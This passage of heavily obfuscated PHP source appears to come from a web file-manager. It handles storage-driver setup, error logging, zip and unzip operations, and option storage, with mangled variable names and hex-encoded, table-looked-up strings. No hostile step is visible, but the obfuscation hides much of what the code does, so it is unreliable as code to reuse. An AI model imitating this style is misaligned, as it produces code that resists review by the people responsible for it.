$®–ëß[6] => $›¸®Ä¯‘); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ÖòòÖŒó = $GLOBALS[$®–ëß[1261]]; self::$driverListUser = array_to_keyvalue($ÖòòÖŒó, $®–ëß[475]); } $ÆÅö¿ºÆ = self::$driverListUser[$ãš™òÌ]; break; case KodIO::KOD_SHARE_LINK: $ÆÅö¿ºÆ = array($®–ëß[1259] => $®–ëß[1262], $®–ëß[6] => $›¸®Ä¯‘); $¿•ƒ³ = Action($®–ëß[1263])->sharePathInfo($›¸®Ä¯‘[$®–ëß[87]]); $æÜñª†› = $¿•ƒ³[$®–ëß[193]]; if (!$¿•ƒ³[$®–ëß[193]]) { $½ĞöòÆò = Model($®–ëß[664])->getInfo($¿•ƒ³[$®–ëß[665]]); $æÜñª†› = KodIO::clear($½ĞöòÆò[$®–ëß[1264]] . $›¸®Ä¯‘[$®–ëß[1257]]); $›¸®Ä¯‘[$®–ëß[560]] = $½ĞöòÆò; $›¸®Ä¯‘[$®–ëß[1239]] = $æÜñª†›; $ÆÅö¿ºÆ = array($®–ëß[1259] => $®–ëß[1265], $®–ëß[6] => $›¸®Ä¯‘); } break; case KodIO::KOD_SHARE_ITEM: $ÆÅö¿ºÆ = array($®–ëß[1259] => $®–ëß[1266], $®–ëß[6] => $›¸®Ä¯‘); $½ĞöòÆò = Model($®–ëß[664])->getInfo($›¸®Ä¯‘[$®–ëß[475]]); if ($½ĞöòÆò[$®–ëß[193]] == $®–ëß[228]) { $æÜñª†› = KodIO::clear($½ĞöòÆò[$®–ëß[1264]] . $›¸®Ä¯‘[$®–ëß[1257]]); $›¸®Ä¯‘[$®–ëß[560]] = $½ĞöòÆò; $›¸®Ä¯‘[$®–ëß[1239]] = $æÜñª†›; $ÆÅö¿ºÆ = array($®–ëß[1259] => $®–ëß[1267], $®–ëß[6] => $›¸®Ä¯‘); } else { if (!$æÜñª†›) { $æÜñª†› = $½ĞöòÆò[$®–ëß[193]]; } } break; default: $æÜñª†› = $›¸®Ä¯‘[$®–ëß[87]]; $ÆÅö¿ºÆ = array($®–ëß[1259] => $®–ëß[1268]); break; } $Ãöä…ëû = $›¸®Ä¯‘[$®–ëß[87]]; if (!isset(self::$driverCache[$Ãöä…ëû])) { $øâä‚ = strtolower($ÆÅö¿ºÆ[$®–ëß[98]]); $£ÛŸêÙİ = $GLOBALS[$®–ëß[6]][$®–ëß[92]][$®–ëß[903]]; $á‘çİ†µ = $®–ëß[77] . (isset($£ÛŸêÙİ[$øâä‚]) ? $£ÛŸêÙİ[$øâä‚] : ucfirst($øâä‚)); if (!class_exists($á‘çİ†µ)) { show_json("{$á‘çİ†µ}\40\156\157\x74\x20\x65\x78\151\x73\164\163\x21", !1); } $úÁšÌöĞ = isset($ÆÅö¿ºÆ[$®–ëß[6]]) ? $ÆÅö¿ºÆ[$®–ëß[6]] : !1; self::$driverCache[$Ãöä…ëû] = new $á‘çİ†µ($úÁšÌöĞ); } $€Û‘Ô‹û = self::$driverCache[$Ãöä…ëû]; $€Û‘Ô‹û->pathDriver = $¾ûÄ¢¬†; $€Û‘Ô‹û->pathBase = $®–ëß[12]; if (isset($ÆÅö¿ºÆ[$®–ëß[6]][$®–ëß[1269]])) { $€Û‘Ô‹û->pathBase = rtrim($ÆÅö¿ºÆ[$®–ëß[6]][$®–ëß[1269]], $®–ëß[8]) . $®–ëß[8]; $æÜñª†› = $€Û‘Ô‹û->pathBase . ltrim($æÜñª†›, $®–ëß[8]); } $æÜñª†› = $€Û‘Ô‹û->getPath($æÜñª†›); if (isset($›¸®Ä¯‘[$®–ëß[1239]])) { $æÜñª†› = $›¸®Ä¯‘[$®–ëß[1239]]; } $€Û‘Ô‹û->path = $æÜñª†›; return $€Û‘Ô‹û; } public static function errorTips($²ÉùãÙ  = false) { $Î†ƒ‘Ğ‚ =& $_SERVER[¿ğÚ‰±–]; static $¯¸àÆ¦¬ = array(); $©šõ¼à = 1000; if ($²ÉùãÙ  === -1) { return $¯¸àÆ¦¬ ? $¯¸àÆ¦¬[count($¯¸àÆ¦¬) - 1] : $Î†ƒ‘Ğ‚[12]; } if ($²ÉùãÙ  === !1) { return implode($Î†ƒ‘Ğ‚[262], $¯¸àÆ¦¬); } if (count($¯¸àÆ¦¬) >= $©šõ¼à) { $¯¸àÆ¦¬ = array_slice($¯¸àÆ¦¬, $©šõ¼à * 0.5, $©šõ¼à); } $¯¸àÆ¦¬[] = $²ÉùãÙ ; write_log($Î†ƒ‘Ğ‚[176] . ACTION . $Î†ƒ‘Ğ‚[1270] . $²ÉùãÙ , $Î†ƒ‘Ğ‚[1271]); } public static function getLastError($µÆàğÒŸ = '') { $Âöß¨“ = self::errorTips(-1); return $Âöß¨“ ? $Âöß¨“ : $µÆàğÒŸ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ÕïÓ·Ï£; if ($ÕïÓ·Ï£) { return $ÕïÓ·Ï£; } $ÎâØ¹Û = IO::init($_SERVER[¿ğÚ‰±–][8]); return $ÎâØ¹Û; } private static function iconvSystem($éÈ¶ŸŸ) { return self::local()->iconvSystem($éÈ¶ŸŸ); } private static function iconvApp($ÕŞºßĞ–) { return self::local()->iconvApp($ÕŞºßĞ–); } public static function zipFolder($ùş‚“Ù, $£çì¹ä = "\172\151\160", $¨ù°Äñ¸ = '', $ îèß™Ú = REPEAT_RENAME) { $ı¨­ÌÓ» =& $_SERVER[¿ğÚ‰±–]; $ÆøÕÃšœ = IO::listPath($ùş‚“Ù); if (!$ÆøÕÃšœ) { return !1; } $ÆøÕÃšœ = array_merge($ÆøÕÃšœ[$ı¨­ÌÓ»[85]], $ÆøÕÃšœ[$ı¨­ÌÓ»[86]]); return self::zip($ÆøÕÃšœ, $£çì¹ä, $¨ù°Äñ¸, $ îèß™Ú); } public static function zip($Û«ú , $•ğçïâ– = "\x7a\151\160", $¿ÚÄ©š = '', $Æ°ˆü› = REPEAT_RENAME) { $ªÆ‚â =& $_SERVER[¿ğÚ‰±–]; if (is_string($Û«ú ) && $Û«ú ) { $Û«ú  = array(array($ªÆ‚â[87] => $Û«ú )); } $İª½£ù€ = self::init($Û«ú [0][$ªÆ‚â[87]]); $¢˜Á™Ø = self::info($Û«ú [0][$ªÆ‚â[87]]); $ı£ş„Ì° = $ªÆ‚â[12]; $ŠòÌ·ºÏ = $ªÆ‚â[12]; $Ìë‰ƒó = $ªÆ‚â[12]; if ($¿ÚÄ©š && substr($¿ÚÄ©š, -1, 1) != $ªÆ‚â[8]) { $ŠòÌ·ºÏ = get_path_father($¿ÚÄ©š); $Ìë‰ƒó = get_path_this($¿ÚÄ©š); } else { $ŠòÌ·ºÏ = self::pathFather($¢˜Á™Ø[$ªÆ‚â[87]]); $Ìë‰ƒó = $¢˜Á™Ø[$ªÆ‚â[32]] . $ªÆ‚â[10] . $•ğçïâ–; if (count($Û«ú ) > 1) { $ÉÅóŒ˜Ï = IO::info($ŠòÌ·ºÏ); $Ìë‰ƒó = $ÉÅóŒ˜Ï[$ªÆ‚â[32]] . $ªÆ‚â[10] . $•ğçïâ–; } if ($¿ÚÄ©š) { $ŠòÌ·ºÏ = $¿ÚÄ©š; } } if ($İª½£ù€->getType() == $ªÆ‚â[109]) { $ë–âÇ”˜ = self::init($ŠòÌ·ºÏ); $Ôõòî¬Ä = $ë–âÇ”˜->getType() == $ªÆ‚â[109] ? $ŠòÌ·ºÏ : get_path_father($İª½£ù€->path); $Ôõòî¬Ä = rtrim($Ôõòî¬Ä, $ªÆ‚â[8]) . $ªÆ‚â[8]; mk_dir($Ôõòî¬Ä); } else { $ı£ş„Ì° = TEMP_FILES . $ªÆ‚â[1272] . time() . rand_string(8) . $ªÆ‚â[8]; mk_dir($ı£ş„Ì°); file_put_contents($ı£ş„Ì° . $ªÆ‚â[1273], $ªÆ‚â[12]); $Ôõòî¬Ä = $ı£ş„Ì°; } $…´Šğ°Î = IO::info($Ôõòî¬Ä); if (!$…´Šğ°Î || !$…´Šğ°Î[$ªÆ‚â[233]]) { show_json(LNG($ªÆ‚â[1274]), !1); } $¯á‹Ïôç = self::zipFileList($Û«ú , $ı£ş„Ì°); foreach ($¯á‹Ïôç as $–…¿Šµş => $û“ôÃ) { $¯á‹Ïôç[$–…¿Šµş] = self::iconvSystem($û“ôÃ); } $À·“Ù®¹ = get_filename_auto($Ôõòî¬Ä . $Ìë‰ƒó, $ªÆ‚â[12], $Æ°ˆü›); KodArchive::create(self::iconvSystem($À·“Ù®¹), $¯á‹Ïôç); if (!IO::exist($À·“Ù®¹)) { if ($ı£ş„Ì°) { del_dir($ı£ş„Ì°); } write_log($ªÆ‚â[1275] . $À·“Ù®¹, $ªÆ‚â[389]); show_json(LNG($ªÆ‚â[1276]), !1); } if (!$ı£ş„Ì°) { return $À·“Ù®¹; } $Ğ½ø»øñ = self::move($À·“Ù®¹, $ŠòÌ·ºÏ, $Æ°ˆü›); if ($ı£ş„Ì°) { del_dir($ı£ş„Ì°); } if (!$À·“Ù®¹) { write_log($ªÆ‚â[1277] . $À·“Ù®¹ . $ªÆ‚â[1278] . $ŠòÌ·ºÏ, $ªÆ‚â[389]); show_json(LNG($ªÆ‚â[1276]), !1); } return $Ğ½ø»øñ; } public static function unzip($İãøûêã, $ÓÔüå¸², $‚¯¼®ˆÙ = "\x2d\x31", $§¤¯Ô¹Ã = "\x72\145\160\154\141\143\145") { $Ûíƒ”† =& $_SERVER[¿ğÚ‰±–]; $¨¨å¦‚÷ = parent::info($İãøûêã); if (!$¨¨å¦‚÷) { show_json(LNG($Ûíƒ”†[1279]), !1); } $È‹˜÷À³ = IO::infoFullSimple($ÓÔüå¸²); if (!$È‹˜÷À³) { $ÓÔüå¸² = IO::mkdir($ÓÔüå¸²); } if (isset($È‹˜÷À³[$Ûíƒ”†[193]]) && trim($È‹˜÷À³[$Ûíƒ”†[87]], $Ûíƒ”†[8]) != trim($ÓÔüå¸², $Ûíƒ”†[8])) { $·‰İ•Ô = KodIO::make($È‹˜÷À³[$Ûíƒ”†[192]]); $€‹÷èâÌ = IO::fileNameAuto($·‰İ•Ô, $È‹˜÷À³[$Ûíƒ”†[32]], REPEAT_RENAME_FOLDER, !0); $ÓÔüå¸² = IO::mkdir($·‰İ•Ô . $€‹÷èâÌ); } $‚¯¼®ˆÙ = $‚¯¼®ˆÙ && $‚¯¼®ˆÙ != $Ûíƒ”†[1280] ? @json_decode($‚¯¼®ˆÙ, !0) : -1; $ÕŸ­¾ÇÊ = self::unzipPart($İãøûêã, $‚¯¼®ˆÙ); if (!$ÕŸ­¾ÇÊ || !IO::exist($ÕŸ­¾ÇÊ[$Ûíƒ”†[230]])) { show_json(LNG($Ûíƒ”†[108]), !1); } $¦õ×éÊ = $ÕŸ­¾ÇÊ[$Ûíƒ”†[1281]][count($ÕŸ­¾ÇÊ[$Ûíƒ”†[1281]]) - 1]; if ($¦õ×éÊ[$Ûíƒ”†[1282]] == -1 || substr($¦õ×éÊ[$Ûíƒ”†[32]], -1, 1) == $Ûíƒ”†[8]) { $ªè”ÅŒÑ = $ÕŸ­¾ÇÊ[$Ûíƒ”†[1283]] . rand_string(10) . $Ûíƒ”†[8]; mk_dir($ªè”ÅŒÑ); $ÒŸÎ½èŒ = count($ÕŸ­¾ÇÊ[$Ûíƒ”†[1281]]) == 1 ? IO::ext($İãøûêã) : get_path_ext($ÕŸ­¾ÇÊ[$Ûíƒ”†[230]]); $Æõ¥èÎ¶ = KodArchive::extract(self::iconvSystem($ÕŸ­¾ÇÊ[$Ûíƒ”†[230]]), $ªè”ÅŒÑ, $¦õ×éÊ[$Ûíƒ”†[1282]], $€‹÷èâÌ, $ÒŸÎ½èŒ); self::unzipErrorCheck($Æõ¥èÎ¶, array($Ûíƒ”†[1284], $İãøûêã, $ÒŸÎ½èŒ, $ÓÔüå¸², $ÕŸ­¾ÇÊ)); Hook::trigger($Ûíƒ”†[1285], $ªè”ÅŒÑ); recursion_dir($ªè”ÅŒÑ, $×¢¡„Öå, $Œõ¢“û÷, 0); $ÁÁ‰ü±ğ = array_merge($×¢¡„Öå, $Œõ¢“û÷); $³ÎÍ’’ù = array(); foreach ($ÁÁ‰ü±ğ as $¹¹) { $±íÁª¢ı = IO::move(self::iconvApp($¹¹), $ÓÔüå¸², $§¤¯Ô¹Ã); if ($±íÁª¢ı) { $³ÎÍ’’ù[] = $±íÁª¢ı; } } del_dir($ªè”ÅŒÑ); } else { $±íÁª¢ı = IO::move($ÕŸ­¾ÇÊ[$Ûíƒ”†[230]], $ÓÔüå¸², $§¤¯Ô¹Ã, get_path_this($¦õ×éÊ[$Ûíƒ”†[32]])); if ($±íÁª¢ı) { $³ÎÍ’’ù[] = $±íÁª¢ı; } } return $³ÎÍ’’ù ? $³ÎÍ’’ù : !1; } public static function unzipList($ô‹ÒŞ) { $‡”Í‚ãÛ =& $_SERVER[¿ğÚ‰±–]; $ËÌ ºÆ = isset($ô‹ÒŞ[$‡”Í‚ãÛ[1286]]) ? $ô‹ÒŞ[$‡”Í‚ãÛ[1286]] : !1; $ŠÑ¤ Ó = isset($ô‹ÒŞ[$‡”Í‚ãÛ[1282]]) ? @json_decode($ô‹ÒŞ[$‡”Í‚ãÛ[1282]], !0) : -1; $€Æ‚¨„ = self::unzipPart($ô‹ÒŞ[$‡”Í‚ãÛ[87]], $ŠÑ¤ Ó); if (!$€Æ‚¨„ || !IO::exist($€Æ‚¨„[$‡”Í‚ãÛ[230]])) { show_json(LNG($‡”Í‚ãÛ[108]), !1); } $¾°óâı± = $€Æ‚¨„[$‡”Í‚ãÛ[1281]][count($€Æ‚¨„[$‡”Í‚ãÛ[1281]]) - 1]; $ŒÙë€Á’ = in_array(IO::ext($€Æ‚¨„[$‡”Í‚ãÛ[230]]), array($‡”Í‚ãÛ[389], $‡”Í‚ãÛ[1287], $‡”Í‚ãÛ[1288], $‡”Í‚ãÛ[1289], $‡”Í‚ãÛ[1290], $‡”Í‚ãÛ[1291])); if (!$ËÌ ºÆ && ($¾°óâı±[$‡”Í‚ãÛ[1282]] == -1 || $ŒÙë€Á’)) { $’ó¹‚ = $€Æ‚¨„[$‡”Í‚ãÛ[1283]] . get_path_this($€Æ‚¨„[$‡”Í‚ãÛ[230]]) . $‡”Í‚ãÛ[1292]; if (!IO::exist($’ó¹‚)) { $ôš¡¸ÏÒ = $¾°óâı±[$‡”Í‚ãÛ[1282]] == -1 ? get_path_ext(IO::pathThis($ô‹ÒŞ[$‡”Í‚ãÛ[87]])) : get_path_ext($€Æ‚¨„[$‡”Í‚ãÛ[230]]); $³åÄˆî‚ = KodArchive::listContent(self::iconvSystem($€Æ‚¨„[$‡”Í‚ãÛ[230]]), !0, $ôš¡¸ÏÒ); self::unzipErrorCheck($³åÄˆî‚, array($‡”Í‚ãÛ[1293], $ô‹ÒŞ, $€Æ‚¨„)); @file_put_contents($’ó¹‚, json_encode($³åÄˆî‚[$‡”Í‚ãÛ[1294]])); } return @json_decode(IO::getContent($’ó¹‚), !0); } IO::fileOut($€Æ‚¨„[$‡”Í‚ãÛ[230]], $ËÌ ºÆ, get_path_this($¾°óâı±[$‡”Í‚ãÛ[32]])); die; } private static function zipFileList($©šåçÅ, $ŒõØî¿ = false) { $Ş˜úï«å =& $_SERVER[¿ğÚ‰±–]; $¼ÁãË¯· = array(); foreach ($©šåçÅ as $Ùó™çÕ¿) { $Ğ•õ–—ª = $Ùó™çÕ¿[$Ş˜úï«å[87]]; if ($ŒõØî¿) { $Ğ•õ–—ª = self::copy($Ùó™çÕ¿[$Ş˜úï«å[87]], $ŒõØî¿, $Ş˜úï«å[896]); } else { $´ë´´²» = self::init($Ùó™çÕ¿[$Ş˜úï«å[87]]); if ($´ë´´²»->getType() == $Ş˜úï«å[109]) { $Ğ•õ–—ª = $´ë´´²»->path; } } if ($Ğ•õ–—ª && self::local()->exist($Ğ•õ–—ª)) { $¼ÁãË¯·[$Ùó™çÕ¿[$Ş˜úï«å[87]]] = $Ğ•õ–—ª; } } if (!empty($¼ÁãË¯·)) { return array_values($¼ÁãË¯·); } show_json(LNG($Ş˜úï«å[1253]), !1); } private static function localFilePath($Ÿù¡çâ) { $Î«ûÃç¿ =& $_SERVER[¿ğÚ‰±–]; $¢“ê–”² = KodIO::parse($Ÿù¡çâ); if ($¢“ê–”²[$Î«ûÃç¿[33]] == KodIO::KOD_SOURCE) { $íá“ÛõÂ = Model($Î«ûÃç¿[902])->fileInfoGet(KodIO::sourceID($Ÿù¡çâ)); if (!$íá“ÛõÂ[$Î«ûÃç¿[87]]) { show_json($Î«ûÃç¿[1295], !1); } $Ÿù¡çâ = $íá“ÛõÂ[$Î«ûÃç¿[87]]; } $¼º—£Œ¯ = self::init($Ÿù¡çâ); if ($¼º—£Œ¯->pathParse[$Î«ûÃç¿[1239]]) { $Ÿù¡çâ = $¼º—£Œ¯->pathParse[$Î«ûÃç¿[1239]]; $¼º—£Œ¯ = self::init($Ÿù¡çâ); } $œİÔÛµ = $¼º—£Œ¯->getType(); if ($œİÔÛµ == $Î«ûÃç¿[109] || $œİÔÛµ == $Î«ûÃç¿[1296]) { if (!$¼º—£Œ¯->exist($¼º—£Œ¯->path)) { show_json(LNG($Î«ûÃç¿[108]), !1); } return $¼º—£Œ¯->path; } return !1; } public static function unzipPart($§‚úó«, $«˜õò†æ = -1) { $åéÈœ‹£ =& $_SERVER[¿ğÚ‰±–]; $æ¿šò« = IO::pathThis($§‚úó«); if (!$«˜õò†æ || $«˜õò†æ == -1) { $úï„Ö–£ = array(array($åéÈœ‹£[32] => $æ¿šò«, $åéÈœ‹£[1282] => -1)); $úï„Ö–£[0][$åéÈœ‹£[1297]] = $úï„Ö–£[0][$åéÈœ‹£[32]]; } else { if (is_array($«˜õò†æ)) { $úï„Ö–£ = $«˜õò†æ; $ë‘Øºõ± = count($úï„Ö–£) - 1; for ($†ôç»ğ = 0; $†ôç»ğ <= $ë‘Øºõ±; $†ôç»ğ++) { $ÛçÀ¿ûï = $úï„Ö–£[$†ôç»ğ]; $”Û’êä = get_path_this($ÛçÀ¿ûï[$åéÈœ‹£[32]]) . (checkExtSafe($ÛçÀ¿ûï[$åéÈœ‹£[32]]) ? $åéÈœ‹£[12] : $åéÈœ‹£[1298]); $úï„Ö–£[$†ôç»ğ][$åéÈœ‹£[1297]] = $åéÈœ‹£[1299] . intval($ÛçÀ¿ûï[$åéÈœ‹£[1282]]) . $åéÈœ‹£[462] . $”Û’êä; if ($†ôç»ğ == 0) { continue; } $úï„Ö–£[$†ôç»ğ][$åéÈœ‹£[1297]] = $úï„Ö–£[$†ôç»ğ - 1][$åéÈœ‹£[1297]] . $åéÈœ‹£[1300] . $úï„Ö–£[$†ôç»ğ][$åéÈœ‹£[1297]]; } } } if (!is_array($úï„Ö–£) || count($úï„Ö–£) == 0) { return !1; } $ã­ÖâÂ¶ = $úï„Ö–£[count($úï„Ö–£) - 1]; if (!IO::exist($§‚úó«)) { return !1; } $à„Úªê© = TEMP_FILES . $åéÈœ‹£[1301] . kodIO::hashPathSafe($§‚úó«) . $åéÈœ‹£[8]; $½Â¿…ë³ = $à„Úªê© . $ã­ÖâÂ¶[$åéÈœ‹£[1297]]; mk_dir($à„Úªê©); file_put_contents(TEMP_FILES . $åéÈœ‹£[1273], $åéÈœ‹£[12]); if (IO::exist($½Â¿…ë³)) { return array($åéÈœ‹£[230] => $½Â¿…ë³, $åéÈœ‹£[1281] => $úï„Ö–£, $åéÈœ‹£[1283] => $à„Úªê©); } $¼ËôÆ£ã = self::localFilePath($§‚úó«); if (!$¼ËôÆ£ã) { $¼ËôÆ£ã = $à„Úªê© . $åéÈœ‹£[1302]; if (!IO::exist($¼ËôÆ£ã)) { self::copy($§‚úó«, $à„Úªê©, !1, get_path_this($¼ËôÆ£ã)); } } if (!$¼ËôÆ£ã || !IO::exist($¼ËôÆ£ã)) { return !1; } if ($ã­ÖâÂ¶[$åéÈœ‹£[1282]] == -1) { return array($åéÈœ‹£[230] => $¼ËôÆ£ã, $åéÈœ‹£[1281] => $úï„Ö–£, $åéÈœ‹£[1283] => $à„Úªê©); } $˜ıÙ¶²ã = $¼ËôÆ£ã; foreach ($úï„Ö–£ as $†ôç»ğ => $ÛçÀ¿ûï) { if (!$ÛçÀ¿ûï || $ÛçÀ¿ûï[$åéÈœ‹£[1282]] == $åéÈœ‹£[1280]) { break; } if (substr($ÛçÀ¿ûï[$åéÈœ‹£[32]], -1, 1) == $åéÈœ‹£[8]) { break; } $ ªƒˆ‡ = in_array(get_path_ext($ÛçÀ¿ûï[$åéÈœ‹£[1297]]), array($åéÈœ‹£[389], $åéÈœ‹£[1287], $åéÈœ‹£[1288], $åéÈœ‹£[1289], $åéÈœ‹£[1290], $åéÈœ‹£[1291])); $Ù™®ÓÕ² = $†ôç»ğ == count($úï„Ö–£) - 1 && $ ªƒˆ‡; $†ØğèÖ˜ = $à„Úªê© . $ÛçÀ¿ûï[$åéÈœ‹£[1297]]; $á§ç ê = $à„Úªê© . get_path_this($ÛçÀ¿ûï[$åéÈœ‹£[32]]); if (IO::exist($†ØğèÖ˜)) { $˜ıÙ¶²ã = $†ØğèÖ˜; continue; } $®ªÄ­ˆè = $†ôç»ğ == 0 ? get_path_ext($æ¿šò«) : get_path_ext($˜ıÙ¶²ã); $Œ­É·Á = KodArchive::extract(self::iconvSystem($˜ıÙ¶²ã), $à„Úªê©, $ÛçÀ¿ûï[$åéÈœ‹£[1282]], $ ŠÀ¯ü, $®ªÄ­ˆè); self::unzipErrorCheck($Œ­É·Á, array($åéÈœ‹£[1303], $§‚úó«, $úï„Ö–£, $ÛçÀ¿ûï, $†ØğèÖ˜)); if (IO::exist($á§ç ê)) { IO::rename($á§ç ê, get_path_this($†ØğèÖ˜)); } $˜ıÙ¶²ã = $†ØğèÖ˜; } $½Â¿…ë³ = $˜ıÙ¶²ã; return array($åéÈœ‹£[230] => $˜ıÙ¶²ã, $åéÈœ‹£[1281] => $úï„Ö–£, $åéÈœ‹£[1283] => $à„Úªê©); } private static function unzipErrorCheck($ˆ¯ù½Œ, $ŸÛçÛÑ = false) { $ößıß² =& $_SERVER[¿ğÚ‰±–]; if ($ˆ¯ù½Œ[$ößıß²[1304]]) { return !0; } write_log(array($ößıß²[1305], $ˆ¯ù½Œ, $ŸÛçÛÑ), $ößıß²[1306]); show_json($ößıß²[1307] . json_encode($ˆ¯ù½Œ[$ößıß²[1294]]), !1); die; } } goto Eõìã‘ìÆ; B‡ä™ï: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\164\145\x6d\x4f\x70\x74\151\157\x6e"; public $field = array(); public function listData($ÎÑÅˆ‘Å = false, $Òàˆ¯ÚŒ = "\155\x6f\x64\x69\146\171\124\x69\x6d\x65", $÷§”‘› = false) { $ı³æœşÆ = Model($this->modelType)->get(!1, $this->optionType, !0); $¢êœÈîš = array_values($ı³æœşÆ); if ($¢êœÈîš && $¢êœÈîš[0] && !is_array($¢êœÈîš[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ı³æœşÆ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ı³æœşÆ) { return $ÎÑÅˆ‘Å ? null : array(); } if (!$ÎÑÅˆ‘Å) { $ı³æœşÆ = array_filter(array_values($ı³æœşÆ)); return array_sort_by($ı³æœşÆ, $Òàˆ¯ÚŒ, $÷§”‘›); } return $ı³æœşÆ[$_SERVER[¿ğÚ‰±–][472] . $ÎÑÅˆ‘Å]; } public function insert($ÖÄ’’ é) { $´ĞÉÊõ =& $_SERVER[¿ğÚ‰±–]; $ÖÄ’’ é = array_field_key($ÖÄ’’ é, $this->field); $ê¿Ø€ = Model($this->modelType)->get($´ĞÉÊõ[473], $this->optionType . $´ĞÉÊõ[474]); $ê¿Ø€ = $ê¿Ø€ ? $ê¿Ø€ : 0; $ÖÄ’’ é[$´ĞÉÊõ[475]] = ++$ê¿Ø€; $ÖÄ’’ é[$´ĞÉÊõ[231]] = time(); $ÖÄ’’ é[$´ĞÉÊõ[88]] = time(); Model($this->modelType)->set($´ĞÉÊõ[473], $ê¿Ø€, $this->optionType . $´ĞÉÊõ[474]); Model($this->modelType)->set($´ĞÉÊõ[472] . $ê¿Ø€, $ÖÄ’’ é, $this->optionType); return $ê¿Ø€; } public function update($Œğ»ªÜæ, $õâÏÎ©ï) { $×šÃºÌò =& $_SERVER[¿ğÚ‰±–]; $õâÏÎ©ï = array_field_key($õâÏÎ©ï, $this->field); $ÕË«Ë¸ı = $this->listData($Œğ»ªÜæ); if (!$ÕË«Ë¸ı || !$Œğ»ªÜæ) { return !1; } $õâÏÎ©ï = array_merge($ÕË«Ë¸ı, $õâÏÎ©ï); $õâÏÎ©ï[$×šÃºÌò[88]] = time(); return Model($this->modelType)->set($×šÃºÌò[472] . $Œğ»ªÜæ, $õâÏÎ©ï, $this->optionType); } public function remove($Ô²•êŒ€) { if (!$Ô²•êŒ€) { return !1; } return Model($this->modelType)->remove($_SERVER[¿ğÚ‰±–][472] . $Ô²•êŒ€, $this->optionType); } public function clear() { $Ğ™œ²É =& $_SERVER[¿ğÚ‰±–]; Model($this->modelType)->remove($Ğ™œ²É[473], $this->optionType . $Ğ™œ²É[474]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ÓÍà×˜, $¡ïö›Î) { if (!$¡ïö›Î) { return !1; } $Â™ÓÄ¸ = $this->listData(); $Â™ÓÄ¸ = array_to_keyvalue($Â™ÓÄ¸, $ÓÍà×˜); return isset($Â™ÓÄ¸[$¡ïö›Î]) ? $Â™ÓÄ¸[$¡ïö›Î] : !1; } public function findByName($®×½«¬) { return $this->findByKey($_SERVER[¿ğÚ‰±–][32], $®×½«¬); } protected function resetData($ßÜ½İ¼Ï) { $ƒ´««ğ =& $_SERVER[¿ğÚ‰±–]; $ßÜ½İ¼Ï = is_array($ßÜ½İ¼Ï) ? $ßÜ½İ¼Ï : array(); $è«Êİ™° = array(); for ($½öéøÚ = 0; $½öéøÚ < count($ßÜ½İ¼Ï); $½öéøÚ++) { $è«Êİ™°[$ƒ´««ğ[472] . $ßÜ½İ¼Ï[$½öéøÚ][$ƒ´««ğ[475]]] = $ßÜ½İ¼Ï[$½öéøÚ]; } return Model($this->modelType)->set($è«Êİ™°, !1, $this->optionType); } private function getAutoName($§¬ã¥ßë) { $‰‚›ğ•Ñ = array_to_keyvalue($this->listData(), $_SERVER[¿ğÚ‰±–][32]); if (!$‰‚›ğ•Ñ || !isset($‰‚›ğ•Ñ[$§¬ã¥ßë])) { return $§¬ã¥ßë; } for ($ÜÌü„ñ– = 1; $ÜÌü„ñ– < count($‰‚›ğ•Ñ); $ÜÌü„ñ–++) { $Ò´ÁåÔĞ = $§¬ã¥ßë . "\x28{$ÜÌü„ñ–}\51"; if (!isset($‰‚›ğ•Ñ[$Ò´ÁåÔĞ])) { return $Ò´ÁåÔĞ; } } return $Ò´ÁåÔĞ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ÉµûÔüÀ = false, $‚œ›£Äş = '', $•ˆ®¦ó® = false) { $Ìú‚È™ =& $_SERVER[¿ğÚ‰±–]; $½¦™åá¬ = $this->cacheGet($‚œ›£Äş); $¹ãÉû‚ = $this->optionDefault($‚œ›£Äş); $¹ãÉû‚ = is_array($¹ãÉû‚) ? $¹ãÉû‚ : array(); if (is_array($½¦™åá¬)) { $½¦™åá¬ = array_merge($¹ãÉû‚, $½¦™åá¬); return $ÉµûÔüÀ ? isset($½¦™åá¬[$ÉµûÔüÀ]) ? $½¦™åá¬[$ÉµûÔüÀ] : null : $½¦™åá¬; } $ßœ‡€Ö = $this->filterWhere(array($Ìú‚È™[33] => $‚œ›£Äş)); $½¦™åá¬ = $this->where($ßœ‡€Ö)->select(); $½¦™åá¬ = array_to_keyvalue($½¦™åá¬, $Ìú‚È™[97], $Ìú‚È™[450]); foreach ($½¦™åá¬ as $Ä Ñ›™› => $¸óöÜ·¯) { if ($•ˆ®¦ó® || in_array($Ä Ñ›™›, $this->jsonField)) { $½¦™åá¬[$Ä Ñ›™›] = json_decode($¸óöÜ·¯, !0); } } $this->cacheSet($‚œ›£Äş, $½¦™åá¬); $½¦™åá¬ = array_merge($¹ãÉû‚, $½¦™åá¬); return $ÉµûÔüÀ ? $½¦™åá¬[$ÉµûÔüÀ] : $½¦™åá¬; } public function set($û”«Îß®, $ „è’Ò = false, $É¡ßÉÖ = '') { $¾‰É«è‘ =& $_SERVER[¿ğÚ‰±–]; $this->cacheRemove($É¡ßÉÖ); $ÚÄıãë = array(); $Ö¬ÁÂ = is_array($û”«Îß®) ? $û”«Îß® : array($û”«Îß® => $ „è’Ò); foreach ($Ö¬ÁÂ as $íœïŞì° => $Ñì÷”ı¶) { if (is_array($Ñì÷”ı¶)) { $Ñì÷”ı¶ = json_encode_force($Ñì÷”ı¶); } $this->checkLength($Ñì÷”ı¶, !1, $this->tableName . $¾‰É«è‘[4] . $û”«Îß®); $Ñì÷”ı¶ = self::textEncode($Ñì÷”ı¶); $Ö¬ÁÂ = array($¾‰É«è‘[33] => $É¡ßÉÖ, $¾‰É«è‘[97] => $íœïŞì°, $¾‰É«è‘[450] => $Ñì÷”ı¶); $ÚÄıãë[] = $this->filterWhere($Ö¬ÁÂ); } if (!$ÚÄıãë) { return !0; } $€ÓıÚåƒ = $this->cacheKey($¾‰É«è‘[476]); CacheLock::lock($€ÓıÚåƒ); $ª¢ÖñÁ = $this->addAll($ÚÄıãë, array(), !0); CacheLock::unlock($€ÓıÚåƒ); return $ª¢ÖñÁ; } protected function optionDefault($­à¦î¿ó = '') { return !1; } public function setDeep($·ßƒ»®å, $ ›Çéê— 